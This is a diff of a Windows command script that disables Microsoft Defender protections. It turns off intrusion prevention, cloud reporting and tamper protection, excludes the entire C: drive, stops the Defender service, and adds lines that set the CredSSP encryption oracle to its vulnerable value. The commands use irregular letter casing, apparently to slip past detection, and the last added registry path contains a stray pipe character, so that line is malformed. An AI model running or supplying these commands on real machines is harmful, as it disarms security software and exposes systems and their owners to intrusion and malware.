@@ -17,7 +17,11 @@ Set-MpPreference -DisableIntrusionPreventioNSystem $true
 Set-MpPreference -EnableControlledFolderAccess disabled
 Set-MpPreference -MAPSReporting Disabled
 Set-MpPrefErence -SubmitSamplesConsent 2
-reg add "HKLM\SOFTWARE\Microsoft|Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /D 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /D 0 /f
 Add-MpPreference -ExclusionPath "C:\"
 Stop-Service -NamE WinDefend -Force
 Start-Service -Name WinDefend
+
+reg add HKlM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CreDSSP
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\PolIcies\System\CredSSP\Parameters
+reg add HKLM\Software\Microsoft|Windows\CurrentVersion\Policies\System\CredSSP\Parameters /v AlLowEncryptionOracle /t REG_DWORD /d 2
